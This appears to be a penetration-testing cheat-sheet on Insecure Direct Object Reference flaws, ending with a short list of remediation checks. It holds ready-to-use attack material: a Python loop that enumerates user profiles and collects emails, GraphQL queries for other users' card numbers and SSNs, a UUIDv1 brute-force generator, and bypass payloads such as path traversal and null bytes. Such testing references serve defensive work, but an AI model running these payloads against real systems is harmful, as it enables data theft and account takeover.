# Insecure Direct Object Reference (IDOR)

Insecure Direct Object References occur when an application exposes internal object identifiers (database IDs, filenames, keys) in a way that allows attackers to manipulate them to access unauthorized data or functionality.

## Identification Techniques

### Parameter Discovery

Look for object references in:

```
# URL path parameters
GET /api/users/1234/profile
GET /documents/invoice-5678.pdf
GET /orders/ORD-2024-0001

# Query string parameters
GET /api/account?id=1234
GET /download?file=report_1234.pdf
GET /view?user_id=5678

# POST body parameters
POST /api/update
{"user_id": 1234, "email": "new@email.com"}

# Headers and cookies
Cookie: user_id=1234; role=user
X-User-Id: 1234
```

### Common Patterns to Test

```
# Sequential integer IDs
/api/users/100 → /api/users/101, /api/users/102

# Predictable string identifiers
/invoices/INV-2024-0001 → /invoices/INV-2024-0002

# Base64 encoded values
/profile?token=MTIzNA== → decode: 1234 → encode 1235: MTIzNQ==

# Hashed values (MD5 of sequential integers)
/doc?id=c4ca4238a0b923820dcc509a6f75849b  → MD5(1)
/doc?id=c81e728d9d4c2f636f067f89cc14862c  → MD5(2)

# UUIDs (check if predictable or sequential)
/api/users/550e8400-e29b-41d4-a716-446655440000
```

## Testing Methodology

### Step 1: Enumerate Object References

1. Create two test accounts (Account A and Account B)
2. Browse the application as Account A, cataloging all object references
3. Note every parameter that contains an ID, filename, or key

### Step 2: Horizontal Privilege Escalation

Access Account B's resources using Account A's session:

```http
# As Account A, try to access Account B's data
GET /api/users/ACCOUNT_B_ID/profile
Authorization: Bearer ACCOUNT_A_TOKEN

# Modify Account B's data
PUT /api/users/ACCOUNT_B_ID/email
Authorization: Bearer ACCOUNT_A_TOKEN
Content-Type: application/json

{"email": "attacker@evil.com"}
```

### Step 3: Vertical Privilege Escalation

Access admin or higher-privilege resources:

```http
# Regular user accessing admin endpoints
GET /api/admin/users
Authorization: Bearer REGULAR_USER_TOKEN

# Accessing another role's functionality
POST /api/users/1234/promote
Authorization: Bearer REGULAR_USER_TOKEN
{"role": "admin"}
```

### Step 4: Automated Enumeration

```python
import requests

base_url = "https://target.com/api/users/{}/profile"
headers = {"Authorization": "Bearer YOUR_TOKEN"}

for user_id in range(1, 1000):
    resp = requests.get(base_url.format(user_id), headers=headers)
    if resp.status_code == 200:
        print(f"[+] Accessible: User {user_id} - {resp.json().get('email', 'N/A')}")
    elif resp.status_code != 403:
        print(f"[?] Unexpected status {resp.status_code} for User {user_id}")
```

## GraphQL IDOR

```graphql
# Query other users' data by manipulating the ID argument
query {
  user(id: "OTHER_USER_ID") {
    email
    phone
    address
    creditCards {
      number
      expiry
    }
  }
}

# Mutation targeting another user's object
mutation {
  updateProfile(userId: "OTHER_USER_ID", input: {email: "evil@attacker.com"}) {
    success
  }
}

# Introspection to discover sensitive queries
{
  __schema {
    queryType {
      fields {
        name
        args { name type { name } }
      }
    }
  }
}

# Node interface abuse (Relay-style)
query {
  node(id: "BASE64_ENCODED_ID") {
    ... on User { email ssn }
    ... on Order { total items { name } }
  }
}
```

## UUID Prediction

While UUIDv4 is cryptographically random, other versions leak information:

```
# UUIDv1 — contains timestamp and MAC address
# Structure: time_low-time_mid-time_hi_and_version-clock_seq-node
550e8400-e29b-11d4-a716-446655440000
                ^--- version 1

# If UUIDv1 is used, you can:
# 1. Extract the timestamp to determine creation time
# 2. Extract the MAC address (last 12 hex digits)
# 3. Predict adjacent UUIDs generated at similar times
```

```python
import uuid

# Generate UUIDv1 variants for brute-force
base = uuid.UUID("550e8400-e29b-11d4-a716-446655440000")
timestamp = base.time  # 100-nanosecond intervals since Oct 15, 1582

# Try nearby timestamps
for offset in range(-1000, 1000):
    candidate = uuid.UUID(fields=(
        (timestamp + offset) & 0xFFFFFFFF,
        ((timestamp + offset) >> 32) & 0xFFFF,
        ((timestamp + offset) >> 48) & 0x0FFF | 0x1000,
        base.clock_seq_hi_variant,
        base.clock_seq_low,
        base.node
    ))
    print(candidate)
```

## Common Bypass Techniques

```
# Parameter pollution
GET /api/users/MY_ID/profile?user_id=VICTIM_ID

# HTTP method switching
# If GET is blocked, try PUT, PATCH, DELETE
PUT /api/users/VICTIM_ID

# Wrapping IDs in arrays
{"id": [VICTIM_ID]}

# Adding extra path segments
/api/users/MY_ID/../VICTIM_ID/profile

# Swapping ID format
/api/users/1234 → /api/users/1234.json
/api/users/1234 → /api/users/1234%00

# Changing API version
/api/v2/users/1234 → /api/v1/users/1234

# Mass assignment with ID override
POST /api/profile/update
{"name": "Test", "id": VICTIM_ID}
```

## IDOR in File Operations

```
# File download
GET /download?file=report_VICTIM_ID.pdf
GET /attachments/../../private/VICTIM_ID/document.pdf

# File upload overwrite
POST /upload
filename="avatar_VICTIM_ID.jpg"

# Export/import features
GET /export?format=csv&user_id=VICTIM_ID
```

## Impact Scenarios

- **Data disclosure**: Access other users' PII, financial records, messages
- **Data modification**: Change other users' passwords, emails, settings
- **Data deletion**: Delete other users' accounts, files, records
- **Financial impact**: Access or transfer funds from other accounts
- **Account takeover**: Change email/phone, trigger password reset to attacker's address

## Remediation Checks

- Verify server-side authorization checks for every object access
- Use indirect references (mapping tables) instead of direct database IDs
- Implement per-object access control lists (ACLs)
- Use UUIDv4 (random) instead of sequential IDs for external-facing identifiers
- Log and monitor access patterns for anomalous enumeration behavior
